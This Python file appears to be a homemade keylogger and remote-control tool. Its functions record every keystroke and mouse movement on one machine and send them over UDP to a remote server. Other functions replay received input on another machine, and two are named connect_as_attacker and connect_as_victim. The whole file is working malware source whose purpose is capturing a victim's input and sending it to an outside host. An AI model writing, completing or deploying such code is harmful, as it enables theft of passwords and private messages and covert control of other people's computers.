import pyautogui as pg
import keyboard as kb
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
screen_width, screen_height = pg.size()


def log_keyboard(server_ip):  # TODO: change print to send
    while 1:
        recorded = f'{kb.read_key()}'
        s.sendto(recorded.encode(), server_ip)


def recreate_keyboard(button: str):
    pg.press(button)


def log_mouse(server_ip):  # TODO: change print to send
    pos = pg.position()
    while 1:
        pos_now = (pg.position()[0] * 100 // screen_width, pg.position()[1] * 100 // screen_height)
        if pos_now != pos:
            pos = pos_now
            s.sendto(f'{pos}'.encode(), server_ip)


def recreate_mouse_movement(pos: str):
    x, y = pos.split(', ')
    x = int(x[1:]) * screen_width // 100
    y = int(y[:-1]) * screen_height // 100
    pg.moveTo(x, y)


def connect_as_attacker(ip_for_connection_as_attacker):
    s.sendto('i am the attacker'.encode(), ip_for_connection_as_attacker)


def connect_as_victim(ip_for_victims):
    s.sendto('i am a victim'.encode(), ip_for_victims)
